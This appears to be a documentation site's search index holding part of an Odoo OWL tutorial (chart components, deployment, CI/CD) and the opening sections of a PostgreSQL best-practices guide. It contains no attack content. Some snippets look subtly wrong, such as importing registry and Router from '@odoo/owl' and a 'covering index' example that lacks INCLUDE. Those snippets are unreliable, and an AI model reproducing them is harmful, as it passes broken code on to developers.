static/src/ts/components/BarChartComponent.ts\nimport { Component, onMounted } from '@odoo/owl';\nimport * as d3 from 'd3';\n\nexport class BarChartComponent extends Component {\n  static template = 'my_owl_module.BarChartComponent';\n\n  setup() {\n    onMounted(() =&gt; {\n      this.drawChart();\n    });\n  }\n\n  drawChart() {\n    const data = this.props.data;\n\n    const width = 500;\n    const height = 300;\n\n    const svg = d3.select(this.el)\n      .append('svg')\n      .attr('width', width)\n      .attr('height', height);\n\n    const x = d3.scaleBand()\n      .domain(data.map((d: any) =&gt; d.name))\n      .range([0, width])\n      .padding(0.1);\n\n    const y = d3.scaleLinear()\n      .domain([0, d3.max(data, (d: any) =&gt; d.value) as number])\n      .nice()\n      .range([height - 20, 20]);\n\n    svg.append('g')\n      .selectAll('rect')\n      .data(data)\n      .enter()\n      .append('rect')\n      .attr('x', (d: any) =&gt; x(d.name)!)\n      .attr('y', (d: any) =&gt; y(d.value))\n      .attr('width', x.bandwidth())\n      .attr('height', (d: any) =&gt; height - 20 - y(d.value))\n      .attr('fill', '#69b3a2');\n\n    // Add X Axis\n    svg.append('g')\n      .attr('transform', `translate(0,${height - 20})`)\n      .call(d3.axisBottom(x));\n\n    // Add Y Axis\n    svg.append('g')\n      .attr('transform', `translate(50,0)`)\n      .call(d3.axisLeft(y));\n  }\n}\n</code></pre></p> </li> <li> <p>Define the BarChart Component Template: <pre><code>&lt;!-- views/bar_chart_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.BarChartComponent\"&gt;\n    &lt;div class=\"bar-chart\"&gt;&lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Use the BarChart Component in a View: <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { Router } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { GreetingCounter } from './components/GreetingCounter';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { PartnerDetailComponent } from './components/PartnerDetailComponent';\nimport { CreatePartnerComponent } from './components/CreatePartnerComponent';\nimport { BarChartComponent } from './components/BarChartComponent';\nimport { routes } from './routes';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('greeting_counter', GreetingCounter);\nregistry.category('actions').add('partner_list', PartnerListComponent);\nregistry.category('actions').add('partner_detail', PartnerDetailComponent);\nregistry.category('actions').add('create_partner', CreatePartnerComponent);\nregistry.category('actions').add('bar_chart', BarChartComponent);\n\nconst router = new Router(routes);\nrouter.mount('#app');\n\n// Handle navigation as before\ndocument.addEventListener('click', (event) =&gt; {\n  const target = event.target as HTMLElement;\n  if (target.tagName === 'A' &amp;&amp; target.getAttribute('href')?.startsWith('/')) {\n    event.preventDefault();\n    const path = target.getAttribute('href');\n    router.navigate(path!);\n  }\n});\n</code></pre></p> </li> <li> <p>Define the BarChart Component Usage: <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"bar_chart_app\" t-att-data='{\"data\": [{\"name\": \"A\", \"value\": 30}, {\"name\": \"B\", \"value\": 80}, {\"name\": \"C\", \"value\": 45}]}'&gt;\n          &lt;/div&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#b-integrating-chartjs-for-enhanced-visualizations","title":"b. Integrating Chart.js for Enhanced Visualizations","text":"<p>Example: Creating a Pie Chart Component with Chart.js</p> <ol> <li> <p>Install Chart.js: <pre><code>npm install chart.js --save\n</code></pre></p> </li> <li> <p>Define the PieChart Component: <pre><code>// static/src/ts/components/PieChartComponent.ts\nimport { Component, onMounted, onBeforeUnmount } from '@odoo/owl';\nimport Chart from 'chart.js/auto';\n\nexport class PieChartComponent extends Component {\n  static template = 'my_owl_module.PieChartComponent';\n  chart: any;\n\n  setup() {\n    onMounted(() =&gt; {\n      this.drawChart();\n    });\n\n    onBeforeUnmount(() =&gt; {\n      if (this.chart) {\n        this.chart.destroy();\n      }\n    });\n  }\n\n  drawChart() {\n    const ctx = (this.el.querySelector('canvas') as HTMLCanvasElement).getContext('2d')!;\n    const data = this.props.data;\n\n    this.chart = new Chart(ctx, {\n      type: 'pie',\n      data: {\n        labels: data.map((d: any) =&gt; d.label),\n        datasets: [{\n          data: data.map((d: any) =&gt; d.value),\n          backgroundColor: ['#FF6384', '#36A2EB', '#FFCE56'],\n        }],\n      },\n      options: {\n        responsive: true,\n      },\n    });\n  }\n}\n</code></pre></p> </li> <li> <p>Define the PieChart Component Template: <pre><code>&lt;!-- views/pie_chart_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.PieChartComponent\"&gt;\n    &lt;div class=\"pie-chart\"&gt;\n      &lt;canvas&gt;&lt;/canvas&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Use the PieChart Component in a View: <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { Router } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { GreetingCounter } from './components/GreetingCounter';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { PartnerDetailComponent } from './components/PartnerDetailComponent';\nimport { CreatePartnerComponent } from './components/CreatePartnerComponent';\nimport { BarChartComponent } from './components/BarChartComponent';\nimport { PieChartComponent } from './components/PieChartComponent';\nimport { routes } from './routes';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('greeting_counter', GreetingCounter);\nregistry.category('actions').add('partner_list', PartnerListComponent);\nregistry.category('actions').add('partner_detail', PartnerDetailComponent);\nregistry.category('actions').add('create_partner', CreatePartnerComponent);\nregistry.category('actions').add('bar_chart', BarChartComponent);\nregistry.category('actions').add('pie_chart', PieChartComponent);\n\nconst router = new Router(routes);\nrouter.mount('#app');\n\n// Handle navigation as before\ndocument.addEventListener('click', (event) =&gt; {\n  const target = event.target as HTMLElement;\n  if (target.tagName === 'A' &amp;&amp; target.getAttribute('href')?.startsWith('/')) {\n    event.preventDefault();\n    const path = target.getAttribute('href');\n    router.navigate(path!);\n  }\n});\n</code></pre></p> </li> <li> <p>Define the PieChart Component Usage: <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"pie_chart_app\" t-att-data='{\"data\": [{\"label\": \"Red\", \"value\": 12}, {\"label\": \"Blue\", \"value\": 19}, {\"label\": \"Yellow\", \"value\": 3}]}'&gt;\n          &lt;/div&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#15-deployment-strategies-for-owl-based-odoo-modules","title":"15. Deployment Strategies for OWL-based Odoo Modules","text":"<p>Deploying OWL-based Odoo modules effectively ensures that your applications are accessible, reliable, and maintainable.</p>"},{"location":"odoo/owl/#a-building-and-bundling-owl-components","title":"a. Building and Bundling OWL Components","text":"<p>Ensure that OWL components are correctly compiled and bundled for production environments.</p> <p>Steps:</p> <ol> <li> <p>Compile TypeScript: <pre><code>npm run build\n</code></pre></p> </li> <li> <p>Minify JavaScript:     Use tools like Terser to minify the compiled JavaScript files.     <pre><code>npm install --save-dev terser\nnpx terser static/src/js/main.js -o static/src/js/main.min.js\n</code></pre></p> </li> <li> <p>Update Asset References:     Modify the asset template to reference the minified JavaScript.     <pre><code>&lt;!-- views/assets.xml --&gt;\n&lt;odoo&gt;\n  &lt;template id=\"assets_backend\" name=\"my_owl_module assets\" inherit_id=\"web.assets_backend\"&gt;\n    &lt;xpath expr=\".\" position=\"inside\"&gt;\n      &lt;script type=\"module\" src=\"/my_owl_module/static/src/js/main.min.js\"&gt;&lt;/script&gt;\n      &lt;t t-call=\"my_owl_module.greeting_template\"/&gt;\n      &lt;t t-call=\"my_owl_module.partner_list_template\"/&gt;\n      &lt;t t-call=\"my_owl_module.partner_detail_template\"/&gt;\n      &lt;t t-call=\"my_owl_module.create_partner_template\"/&gt;\n      &lt;t t-call=\"my_owl_module.bar_chart_template\"/&gt;\n      &lt;t t-call=\"my_owl_module.pie_chart_template\"/&gt;\n      &lt;t t-call=\"my_owl_module.tooltip_template\"/&gt;\n    &lt;/xpath&gt;\n  &lt;/template&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#b-integrating-with-odoosh","title":"b. Integrating with Odoo.sh","text":"<p>Odoo.sh is Odoo's cloud platform tailored for deploying Odoo applications with ease.</p> <p>Benefits:</p> <ul> <li>Automated Deployments: Seamless integration with Git repositories for automatic deployments.</li> <li>Staging Environments: Test changes in staging before pushing to production.</li> <li>Built-In Backups: Regular backups to safeguard data.</li> </ul> <p>Steps:</p> <ol> <li> <p>Connect Your Git Repository:</p> <ul> <li>Push your custom module to a Git repository (e.g., GitHub, GitLab).</li> <li>Link the repository to Odoo.sh.</li> </ul> </li> <li> <p>Configure Build Settings:</p> <ul> <li>Define build commands in Odoo.sh settings.</li> <li>Ensure that TypeScript is compiled during the build process.</li> </ul> </li> <li> <p>Deploy:</p> <ul> <li>Odoo.sh automatically builds and deploys the application upon pushing changes to the repository.</li> </ul> </li> </ol>"},{"location":"odoo/owl/#c-hosting-on-third-party-platforms","title":"c. Hosting on Third-Party Platforms","text":"<p>Alternatively, deploy OWL-based Odoo modules on platforms like AWS, DigitalOcean, or Heroku.</p> <p>Example: Deploying on AWS EC2</p> <ol> <li> <p>Set Up an EC2 Instance:</p> <ul> <li>Choose an appropriate instance type based on your application's requirements.</li> <li>Install necessary dependencies (Node.js, npm, PostgreSQL, etc.).</li> </ul> </li> <li> <p>Clone Your Repository: <pre><code>git clone https://github.com/yourusername/my_owl_module.git\ncd my_owl_module\n</code></pre></p> </li> <li> <p>Install Dependencies and Build: <pre><code>npm install\nnpm run build\n</code></pre></p> </li> <li> <p>Configure Odoo to Serve Static Assets:     Ensure that Odoo's web server serves the compiled OWL assets correctly.</p> </li> <li> <p>Set Up a Reverse Proxy with Nginx: <pre><code>server {\n    listen 80;\n    server_name yourdomain.com;\n\n    location / {\n        proxy_pass http://localhost:8069;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n</code></pre></p> </li> <li> <p>Enable HTTPS:     Use Let's Encrypt to obtain SSL certificates.     <pre><code>sudo apt install certbot python3-certbot-nginx -y\nsudo certbot --nginx -d yourdomain.com\n</code></pre></p> </li> <li> <p>Start Odoo Service: <pre><code>sudo systemctl start odoo\nsudo systemctl enable odoo\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#d-continuous-integration-and-deployment-cicd","title":"d. Continuous Integration and Deployment (CI/CD)","text":"<p>Automate the build, test, and deployment processes to ensure consistency and reliability.</p> <p>Example: GitHub Actions for CI/CD</p> <ol> <li> <p>Create a Workflow File: <pre><code># .github/workflows/ci-cd.yml\nname: CI/CD Pipeline\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v2\n\n    - name: Set up Node.js\n      uses: actions/setup-node@v2\n      with:\n        node-version: '16'\n\n    - name: Install Dependencies\n      run: |\n        npm install\n        npm run build\n\n    - name: Run Tests\n      run: |\n        npm run test\n\n    - name: Deploy to Server\n      uses: appleboy/ssh-action@v0.1.5\n      with:\n        host: ${{ secrets.SERVER_HOST }}\n        username: ${{ secrets.SERVER_USER }}\n        key: ${{ secrets.SERVER_SSH_KEY }}\n        script: |\n          cd /path/to/odoo/addons/my_owl_module\n          git pull origin main\n          npm install\n          npm run build\n          sudo systemctl restart odoo\n</code></pre></p> </li> <li> <p>Configure Secrets:</p> <ul> <li><code>SERVER_HOST</code>: IP address or hostname of your server.</li> <li><code>SERVER_USER</code>: SSH username.</li> <li><code>SERVER_SSH_KEY</code>: Private SSH key for authentication.</li> </ul> </li> <li> <p>Trigger the Workflow:</p> <ul> <li>Push changes to the <code>main</code> branch to trigger the build and deployment process.</li> </ul> </li> </ol>"},{"location":"odoo/owl/#e-optimizing-asset-delivery","title":"e. Optimizing Asset Delivery","text":"<p>Ensure that OWL assets are delivered efficiently to enhance load times and user experience.</p> <p>Best Practices:</p> <ul> <li>Enable Compression: Use Gzip or Brotli to compress JavaScript and CSS files.</li> <li>Leverage Caching: Set appropriate cache headers for static assets.</li> <li>Use a Content Delivery Network (CDN): Distribute assets globally for faster access.</li> </ul> <p>Example: Configuring Gzip Compression with Nginx</p> <pre><code>server {\n    listen 443 ssl;\n    server_name yourdomain.com;\n\n    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;\n\n    gzip on;\n    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\n    location / {\n        proxy_pass http://localhost:8069;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n</code></pre>"},{"location":"odoo/owl/#16-conclusion-and-best-practices-summary","title":"16. Conclusion and Best Practices Summary","text":"<p>Mastering the OWL framework within Odoo empowers developers to build modern, efficient, and scalable front-end applications that seamlessly integrate with Odoo's robust backend. By adhering to the best practices outlined in this guide, you can ensure that your OWL-based Odoo modules are maintainable, performant, and secure.</p> <p>Key Takeaways:</p> <ul> <li>Understand OWL's Core Concepts: Grasp the fundamentals of components, reactivity, templates, hooks, and state management.</li> <li>Leverage TypeScript: Utilize TypeScript for enhanced type safety and developer tooling.</li> <li>Optimize Performance: Implement strategies like lazy loading, code splitting, and efficient state management to enhance application performance.</li> <li>Ensure Security: Sanitize user inputs, protect against CSRF, implement RBAC, and secure data transmission.</li> <li>Implement Comprehensive Testing: Use unit, integration, and E2E tests to validate component functionality and interactions.</li> <li>Adhere to Coding Standards: Maintain consistency through linters, naming conventions, and thorough documentation.</li> <li>Utilize External Libraries Wisely: Enhance functionality with libraries like D3.js and Chart.js while ensuring compatibility and performance.</li> <li>Automate Deployment: Streamline build and deployment processes with CI/CD pipelines and tools like Odoo.sh or third-party platforms.</li> <li>Maintain Accessibility: Ensure that your OWL components are accessible to all users by following web accessibility standards.</li> <li>Regularly Update and Audit: Keep OWL and Odoo dependencies up-to-date and conduct regular security audits to maintain application integrity.</li> </ul> <p>Final Thoughts:</p> <p>The integration of the OWL framework into Odoo represents a significant advancement in building dynamic and responsive business applications. By embracing OWL's modern web development paradigms and following the best practices outlined in this guide, you can develop Odoo modules that not only meet current business needs but also adapt to future challenges and innovations.</p> <p>Embrace the power of OWL to elevate your Odoo development experience, delivering exceptional user experiences and robust functionalities that drive business success.</p>"},{"location":"postgresql/postgres/","title":"Advanced PostgreSQL: Expert-Level Best Practices, Optimizations, and Latest Features","text":"<p>PostgreSQL is a powerful, open-source relational database system celebrated for its robustness, extensibility, and compliance with SQL standards. This comprehensive guide delves into expert-level PostgreSQL practices, covering advanced configurations, performance optimizations, security measures, scalability strategies, and the latest features introduced up to PostgreSQL version 16. Whether you're a seasoned DBA or a developer seeking to harness PostgreSQL's full potential, this guide provides the insights necessary to build high-performance, secure, and scalable database systems.</p>"},{"location":"postgresql/postgres/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Installation and Initial Configuration</li> <li>Advanced Data Types and Extensions</li> <li>Indexing Strategies</li> <li>Query Optimization and Performance Tuning</li> <li>Partitioning and Sharding</li> <li>Replication and High Availability</li> <li>Backup and Disaster Recovery</li> <li>Security Best Practices</li> <li>Monitoring and Maintenance</li> <li>Latest Features in PostgreSQL 16</li> <li>Scaling PostgreSQL</li> <li>Advanced Data Modeling</li> <li>Custom Functions and Stored Procedures</li> <li>Best Practices Summary</li> </ol>"},{"location":"postgresql/postgres/#1-installation-and-initial-configuration","title":"1. Installation and Initial Configuration","text":""},{"location":"postgresql/postgres/#a-choosing-the-right-version","title":"a. Choosing the Right Version","text":"<ul> <li>Stability vs. Features: Opt for the latest stable release to benefit from recent features and performance improvements while ensuring reliability.</li> <li>Long-Term Support (LTS): Consider versions with extended support periods for enterprise environments.</li> </ul>"},{"location":"postgresql/postgres/#b-installing-postgresql","title":"b. Installing PostgreSQL","text":"<p>On Ubuntu: <pre><code>sudo apt update\nsudo apt install postgresql postgresql-contrib\n</code></pre></p> <p>On macOS using Homebrew: <pre><code>brew update\nbrew install postgresql\nbrew services start postgresql\n</code></pre></p> <p>On Windows: Download the installer from PostgreSQL Downloads and follow the installation wizard.</p>"},{"location":"postgresql/postgres/#c-basic-configuration","title":"c. Basic Configuration","text":"<p>Editing <code>postgresql.conf</code>: Located typically at <code>/etc/postgresql/&lt;version&gt;/main/postgresql.conf</code> or <code>/usr/local/var/postgres/postgresql.conf</code>.</p> <ul> <li> <p>Listen Addresses: <pre><code>listen_addresses = 'localhost'  # Restrict to local access\n</code></pre></p> </li> <li> <p>Port: <pre><code>port = 5432\n</code></pre></p> </li> <li> <p>Max Connections: <pre><code>max_connections = 200  # Adjust based on application needs\n</code></pre></p> </li> <li> <p>Shared Buffers: <pre><code>shared_buffers = 512MB  # Typically 25% of system RAM\n</code></pre></p> </li> <li> <p>Work Memory: <pre><code>work_mem = 64MB  # Per operation memory\n</code></pre></p> </li> <li> <p>Maintenance Work Memory: <pre><code>maintenance_work_mem = 1GB\n</code></pre></p> </li> <li> <p>Effective Cache Size: <pre><code>effective_cache_size = 4GB  # Roughly 75% of system RAM\n</code></pre></p> </li> <li> <p>Logging: <pre><code>logging_collector = on\nlog_directory = 'log'\nlog_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'\nlog_min_duration_statement = 500  # Log queries longer than 500ms\nlog_statement = 'none'  # Adjust as needed\n</code></pre></p> </li> </ul> <p>Editing <code>pg_hba.conf</code>: Located in the same directory as <code>postgresql.conf</code>.</p> <ul> <li> <p>Local Connections: <pre><code># TYPE  DATABASE        USER            ADDRESS                 METHOD\nlocal   all             all                                     md5\n</code></pre></p> </li> <li> <p>Host-Based Connections: <pre><code>host    all             all             127.0.0.1/32            md5\nhost    all             all             ::1/128                 md5\n</code></pre></p> </li> </ul>"},{"location":"postgresql/postgres/#d-restarting-postgresql","title":"d. Restarting PostgreSQL","text":"<p>After making configuration changes, restart PostgreSQL to apply them.</p> <p>On Ubuntu: <pre><code>sudo systemctl restart postgresql\n</code></pre></p> <p>On macOS with Homebrew: <pre><code>brew services restart postgresql\n</code></pre></p>"},{"location":"postgresql/postgres/#2-advanced-data-types-and-extensions","title":"2. Advanced Data Types and Extensions","text":""},{"location":"postgresql/postgres/#a-jsonb","title":"a. JSONB","text":"<p>Description: Efficient storage of JSON data with indexing capabilities.</p> <p>Usage: <pre><code>CREATE TABLE products (\n    id SERIAL PRIMARY KEY,\n    name TEXT NOT NULL,\n    attributes JSONB\n);\n</code></pre></p> <p>Indexing JSONB: <pre><code>CREATE INDEX idx_products_attributes ON products USING GIN (attributes);\n</code></pre></p>"},{"location":"postgresql/postgres/#b-array-types","title":"b. Array Types","text":"<p>Description: Store arrays of elements within a single table column.</p> <p>Usage: <pre><code>CREATE TABLE surveys (\n    id SERIAL PRIMARY KEY,\n    question TEXT NOT NULL,\n    choices TEXT[]  -- Array of text choices\n);\n</code></pre></p> <p>Querying Arrays: <pre><code>SELECT * FROM surveys WHERE 'Option A' = ANY(choices);\n</code></pre></p>"},{"location":"postgresql/postgres/#c-hstore","title":"c. HStore","text":"<p>Description: Key-value store within PostgreSQL.</p> <p>Installation: <pre><code>CREATE EXTENSION hstore;\n</code></pre></p> <p>Usage: <pre><code>CREATE TABLE user_preferences (\n    id SERIAL PRIMARY KEY,\n    user_id INTEGER REFERENCES users(id),\n    preferences HSTORE\n);\n</code></pre></p> <p>Querying HStore: <pre><code>SELECT * FROM user_preferences WHERE preferences -&gt; 'theme' = 'dark';\n</code></pre></p>"},{"location":"postgresql/postgres/#d-postgis","title":"d. PostGIS","text":"<p>Description: Spatial and geographic objects for location-based applications.</p> <p>Installation: <pre><code>sudo apt install postgis\n</code></pre> <pre><code>CREATE EXTENSION postgis;\n</code></pre></p> <p>Usage: <pre><code>CREATE TABLE locations (\n    id SERIAL PRIMARY KEY,\n    name TEXT NOT NULL,\n    geom GEOGRAPHY(Point, 4326)  -- Geographic coordinate system\n);\n</code></pre></p> <p>Spatial Queries: <pre><code>SELECT name FROM locations\nWHERE ST_DWithin(\n    geom,\n    ST_GeographyFromText('SRID=4326;POINT(-73.935242 40.730610)'),\n    1000  -- Distance in meters\n);\n</code></pre></p>"},{"location":"postgresql/postgres/#e-enumerated-types","title":"e. Enumerated Types","text":"<p>Description: Define custom data types with a static set of values.</p> <p>Usage: <pre><code>CREATE TYPE order_status AS ENUM ('pending', 'shipped', 'delivered', 'canceled');\n\nCREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    status order_status NOT NULL DEFAULT 'pending',\n    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()\n);\n</code></pre></p>"},{"location":"postgresql/postgres/#3-indexing-strategies","title":"3. Indexing Strategies","text":"<p>Effective indexing is paramount for query performance. PostgreSQL offers various indexing methods beyond the default B-tree.</p>"},{"location":"postgresql/postgres/#a-b-tree-indexes","title":"a. B-tree Indexes","text":"<p>Description: Default and versatile index type suitable for equality and range queries.</p> <p>Creating an Index: <pre><code>CREATE INDEX idx_users_username ON users (username);\n</code></pre></p>"},{"location":"postgresql/postgres/#b-gin-and-gist-indexes","title":"b. GIN and GiST Indexes","text":"<p>Description: Suitable for full-text search, JSONB, array fields, and geometric data.</p> <p>Example for JSONB: <pre><code>CREATE INDEX idx_products_attributes ON products USING GIN (attributes);\n</code></pre></p> <p>Example for PostGIS: <pre><code>CREATE INDEX idx_locations_geom ON locations USING GIST (geom);\n</code></pre></p>"},{"location":"postgresql/postgres/#c-partial-indexes","title":"c. Partial Indexes","text":"<p>Description: Index a subset of table rows based on a condition, reducing index size and improving performance.</p> <p>Example: <pre><code>CREATE INDEX idx_active_users ON users (email) WHERE is_active = TRUE;\n</code></pre></p>"},{"location":"postgresql/postgres/#d-expression-indexes","title":"d. Expression Indexes","text":"<p>Description: Index based on the result of an expression, enabling efficient querying of computed values.</p> <p>Example: <pre><code>CREATE INDEX idx_lower_username ON users (LOWER(username));\n</code></pre></p>"},{"location":"postgresql/postgres/#e-brin-indexes","title":"e. BRIN Indexes","text":"<p>Description: Block Range Indexes for very large tables with naturally ordered data, offering smaller size with approximate query performance.</p> <p>Example: <pre><code>CREATE INDEX idx_large_table_created_at ON large_table USING BRIN (created_at);\n</code></pre></p>"},{"location":"postgresql/postgres/#f-covering-indexes","title":"f. Covering Indexes","text":"<p>Description: Include additional columns in an index to cover queries, reducing the need to access the table data.</p> <p>Example: <pre><code>CREATE INDEX idx_orders_status_created_at ON orders (status, created_at);\n</code></pre></p>"},{"location":"postgresql/postgres/#g-unique-indexes","title":"g. Unique Indexes","text":"<p>Description: Enforce uniqueness of column values, preventing duplicate entries.</p> <p>Example: <pre><code>CREATE UNIQUE INDEX idx_unique_email ON users (email);\n</code></pre></p>"},{"location":"postgresql/postgres/#4-query-optimization-and-performance-tuning","title":"4. Query Optimization and Performance Tuning","text":"<p>Optimizing queries ensures efficient data retrieval and overall database performance.</p>"},{"location":"postgresql/postgres/#a-analyzing-query-performance","title":"a. Analyzing Query Performance","text":"<p>Using <code>EXPLAIN</code> and <code>EXPLAIN ANALYZE</code>: <pre><code>EXPLAIN ANALYZE SELECT * FROM products WHERE price &gt; 100;\n</code></pre> - <code>EXPLAIN</code>: Provides the query execution plan. - <code>EXPLAIN ANALYZE</code>: Executes the query and shows actual run times.</p> <p>Interpreting Results: - Seq Scan vs. Index Scan: Prefer index scans for large tables to avoid full table scans. - Cost Estimates: Lower costs indicate more efficient plans. - Actual Time: Helps identify discrepancies between estimates and real performance.</p>"},{"location":"postgresql/postgres/#b-optimizing-joins","title":"b. Optimizing Joins","text":"<ul> <li>Use Proper Indexes: Ensure join columns are indexed.</li> <li>Join Order: PostgreSQL's planner generally handles this, but explicit ordering can sometimes help.</li> <li>Avoid Unnecessary Columns: Select only required columns to reduce data transfer.</li> </ul> <p>Example: <pre><code>SELECT u.username, p.name\nFROM users u\nJOIN posts p ON u.id = p.user_id\nWHERE u.active = TRUE;\n</code></pre> Ensure indexes on <code>users.id</code>, <code>users.active</code>, and <code>posts.user_id</code>.</p>"},{"location":"postgresql/postgres/#c-reducing-query-complexity","title":"c. Reducing Query Complexity","text":"<ul> <li>Avoid Subqueries: Use joins or Common Table Expressions (CTEs) instead.</li> <li>Use CTEs Wisely: Materialized CTEs can improve readability but may impact performance if not used appropriately.</li> <li>Leverage Window Functions: Perform calculations without multiple queries.</li> </ul> <p>Example Using Window Functions: <pre><code>SELECT \n    id, \n    name, \n    price, \n    AVG(price) OVER () AS average_price\nFROM products;\n</code></pre></p>"},{"location":"postgresql/postgres/#d-utilizing-vacuum-and-analyze","title":"d. Utilizing <code>VACUUM</code> and <code>ANALYZE</code>","text":"<ul> <li><code>VACUUM</code>: Reclaims storage occupied by dead tuples.</li> <li><code>ANALYZE</code>: Updates statistics used by the query planner.</li> </ul> <p>Automated Maintenance: Configure <code>autovacuum</code> settings in <code>postgresql.conf</code> for regular maintenance.</p> <pre><code>autovacuum = on\nautovacuum_naptime = 1min\nautovacuum_vacuum_threshold = 50\nautovacuum_analyze_threshold = 50\nautovacuum_vacuum_scale_factor = 0.2\nautovacuum_analyze_scale_factor = 0.1\n</code></pre>"},{"location":"postgresql/postgres/#e-caching-strategies","title":"e. Caching Strategies","text":"<ul> <li>Result Caching: Cache frequently executed queries using external caching systems like Redis or Memcached.</li> <li>Prepared Statements: Use prepared statements to reduce parsing and planning overhead.</li> </ul> <p>Example Using Prepared Statements: <pre><code>PREPARE expensive_query AS\nSELECT * FROM products WHERE price &gt; $1;\n\nEXECUTE expensive_query(100);\n</code></pre></p>"},{"location":"postgresql/postgres/#f-parallel-query-execution","title":"f. Parallel Query Execution","text":"<p>Leverage PostgreSQL's ability to execute parts of a query in parallel.</p> <p>Configuration: <pre><code>max_parallel_workers_per_gather = 4\n</code></pre></p> <p>Usage: Enable parallelism for suitable queries by ensuring: - The table is large enough. - Proper indexes exist. - Queries are written to allow parallel execution.</p>"},{"location":"postgresql/postgres/#5-partitioning-and-sharding","title":"5. Partitioning and Sharding","text":"<p>Handling large datasets efficiently requires partitioning or sharding the database.</p>"},{"location":"postgresql/postgres/#a-table-partitioning","title":"a. Table Partitioning","text":"<p>Description: Divides a large table into smaller, more manageable pieces called partitions.</p> <p>Types of Partitioning: - Range Partitioning: Based on ranges of values (e.g., dates). - List Partitioning: Based on a list of values (e.g., categories). - Hash Partitioning: Distributes rows across partitions using a hash function.</p> <p>Example: Range Partitioning by Date: <pre><code>CREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    order_date DATE NOT NULL,\n    amount DECIMAL\n) PARTITION BY RANGE (order_date);\n\nCREATE TABLE orders_2023 PARTITION OF orders\n    FOR VALUES FROM ('2023-01-01') TO ('2024-01-01');\n\nCREATE TABLE orders_2024 PARTITION OF orders\n    FOR VALUES FROM ('2024-01-01') TO ('2025-01-01');\n</code></pre></p>"},{"location":"postgresql/postgres/#b-declarative-partitioning","title":"b. Declarative Partitioning","text":"<p>Description: Introduced in PostgreSQL 10, allows easy management of partitions without extensive boilerplate.</p> <p>Benefits: - Simplified syntax. - Improved planner support. - Enhanced performance for partitioned tables.</p> <p>Example: As above in Range Partitioning.</p>"},{"location":"postgresql/postgres/#c-sharding","title":"c. Sharding","text":"<p>Description: Distributes data across multiple database instances to achieve horizontal scalability.</p> <p>Implementation Strategies: - Application-Level Sharding: The application directs queries to specific shards based on sharding keys. - Citus Extension: Transforms PostgreSQL into a distributed database, handling sharding transparently.</p> <p>Example Using Citus: <pre><code># Install Citus\nsudo apt install postgresql-16-citus-12.3\n\n# Configure Citus in postgresql.conf\nshared_preload_libraries = 'citus'\n\n# Restart PostgreSQL\nsudo systemctl restart postgresql\n</code></pre></p> <p>Creating a Distributed Table: <pre><code>SELECT create_distributed_table('orders', 'order_id');\n</code></pre></p>"},{"location":"postgresql/postgres/#d-benefits-and-trade-offs","title":"d. Benefits and Trade-offs","text":"<ul> <li>Benefits:</li> <li>Enhanced performance for large datasets.</li> <li> <p>Improved scalability.</p> </li> <li> <p>Trade-offs:</p> </li> <li>Increased complexity in management.</li> <li>Potential for data distribution skew.</li> </ul>"},{"location":"postgresql/postgres/#6-replication-and-high-availability","title":"6. Replication and High 